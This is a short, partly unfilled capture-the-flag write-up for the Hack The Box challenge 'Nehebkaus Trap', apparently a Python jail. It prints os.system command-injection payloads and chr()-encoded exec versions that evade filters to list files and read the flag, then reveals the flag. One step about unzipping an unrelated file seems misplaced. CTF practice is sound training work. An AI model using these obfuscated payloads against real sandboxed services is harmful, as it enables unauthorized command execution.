# Challenge Name: Nehebkaus Trap

**Category:** Misc  
**Points:** [Point value]  
**Author:** [Your name]  
**Team:** [Your team name]  
**Completion Date:** [Date of comple7tion]

## Introduction

In search of the ancient relic, you go looking for the Pharaoh's tomb inside the pyramids. A giant granite block falls and blocks your exit, and the walls start closing in! You are trapped. Can you make it out alive and continue your quest?


## Tools Used

- telnet
- [Tool 2]
- [Tool 3]

## Initial Analysis

__import__('os').system('ls')
__import__('os').

## Detailed Methodology

### Step 1: Identified vulnerability

```file hw_debug.sal)```
unzip hw_debug.sal
### Step 2: Recon
Now using this vulnerability I try to find where the flag is located using ls.
```__import__('os').system('ls')```

```exec(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(108)+chr(115)+chr(39)+chr(41))```


### Step 3: Flag

Next I run cat flag.txt to read the flag 
```__import__('os').system('cat flag.txt')```

```exec(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+chr(41))```

## Flag Capture

Step 1, 2, 3

<details>
<summary>Click to reveal the flag</summary>
HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}                                             
